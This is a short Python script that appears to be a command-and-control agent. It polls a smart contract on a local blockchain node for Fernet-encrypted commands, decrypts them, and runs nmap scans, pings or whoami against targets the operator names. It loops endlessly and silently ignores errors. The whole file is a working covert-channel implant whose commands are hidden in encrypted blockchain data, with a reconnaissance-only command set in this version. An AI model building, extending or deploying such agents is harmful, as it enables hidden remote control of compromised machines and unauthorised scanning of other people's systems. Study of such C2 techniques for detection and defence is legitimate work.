from web3 import Web3
from cryptography.fernet import Fernet
import json
import time
import subprocess

# Load key
with open("key.key","rb") as f:
    key = f.read()

cipher = Fernet(key)

# Connect blockchain
w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

# Load ABI
with open("abi.json") as f:
    abi = json.load(f)

contract_address = "PUT_CONTRACT_ADDRESS"

contract = w3.eth.contract(address=contract_address, abi=abi)

print("Agent started...")

cmd_id = 0

while True:

    try:

        encrypted = contract.functions.getCommand(cmd_id).call()

        if encrypted != "":

            decrypted = cipher.decrypt(encrypted.encode()).decode()

            cmd, target = decrypted.split(":")

            print("\n[+] New Command")
            print("Command:", cmd)
            print("Target:", target)

            # Execute command
            if cmd == "scan":
                subprocess.run(["nmap", target])

            elif cmd == "ping":
                subprocess.run(["ping", "-c", "4", target])

            elif cmd == "whoami":
                subprocess.run(["whoami"])

            else:
                print("Unknown command")

            cmd_id += 1

    except Exception as e:
        pass


    time.sleep(5)
